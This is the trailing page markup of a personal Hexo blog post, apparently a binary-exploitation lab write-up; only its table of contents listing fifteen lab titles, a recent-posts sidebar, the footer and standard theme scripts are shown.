        });</script></div></div></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#lab1-sysmagic"><span class="level-left"><span class="level-item">1</span><span class="level-item">lab1 - sysmagic</span></span></a></li><li><a class="level is-mobile" href="#lab2-orw"><span class="level-left"><span class="level-item">2</span><span class="level-item">lab2 - orw</span></span></a></li><li><a class="level is-mobile" href="#lab3-ret2sc"><span class="level-left"><span class="level-item">3</span><span class="level-item">lab3 - ret2sc</span></span></a></li><li><a class="level is-mobile" href="#lab4-ret2lib"><span class="level-left"><span class="level-item">4</span><span class="level-item">lab4 - ret2lib</span></span></a></li><li><a class="level is-mobile" href="#lab5-simplerop"><span class="level-left"><span class="level-item">5</span><span class="level-item">lab5 - simplerop</span></span></a></li><li><a class="level is-mobile" href="#lab6-migration"><span class="level-left"><span class="level-item">6</span><span class="level-item">lab6 - migration</span></span></a></li><li><a class="level is-mobile" href="#lab7-crack"><span class="level-left"><span class="level-item">7</span><span class="level-item">lab7 - crack</span></span></a></li><li><a class="level is-mobile" href="#lab8-craxme"><span class="level-left"><span class="level-item">8</span><span class="level-item">lab8 - craxme</span></span></a></li><li><a class="level is-mobile" href="#lab9-playfmt"><span class="level-left"><span class="level-item">9</span><span class="level-item">lab9 - playfmt</span></span></a></li><li><a class="level is-mobile" href="#lab10-hacknote"><span class="level-left"><span class="level-item">10</span><span class="level-item">lab10 - hacknote</span></span></a></li><li><a class="level is-mobile" href="#lab11-bamboobox"><span class="level-left"><span class="level-item">11</span><span class="level-item">lab11 - bamboobox</span></span></a></li><li><a class="level is-mobile" href="#lab12-secretgarden"><span class="level-left"><span class="level-item">12</span><span class="level-item">lab12 - secretgarden</span></span></a></li><li><a class="level is-mobile" href="#lab13-heapcreator"><span class="level-left"><span class="level-item">13</span><span class="level-item">lab13 - heapcreator</span></span></a></li><li><a class="level is-mobile" href="#lab14-magicheap"><span class="level-left"><span class="level-item">14</span><span class="level-item">lab14 - magicheap</span></span></a></li><li><a class="level is-mobile" href="#lab15-zoo"><span class="level-left"><span class="level-item">15</span><span class="level-item">lab15 - zoo</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-10T15:31:41.000Z">2021-10-10</time></p><p class="title"><a href="/post/Kubernetes/">Kubernetes 笔记</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-05T14:24:56.000Z">2021-10-05</time></p><p class="title"><a href="/post/Intro2Crypto/">密码学笔记</a></p><p class="categories"><a href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-25T17:44:35.000Z">2021-09-25</time></p><p class="title"><a href="/post/Dockerfile2GKE/">从 Dockerfile 到 GKE：再探 GitHub Actions</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-23T09:03:42.000Z">2021-09-23</time></p><p class="title"><a href="/post/GCP/">Google Cloud Platform 基础</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-10T08:27:59.000Z">2021-09-10</time></p><p class="title"><a href="/post/Container/">云原生技术原理</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a><p class="is-size-7"><span>&copy; 2021 Mercury</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load", function () {
            outdatedBrowser({
                bgColor: '#f25648',
                color: '#ffffff',
                lowerThan: 'object-fit' // display on IE11 or below
            });
        });</script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>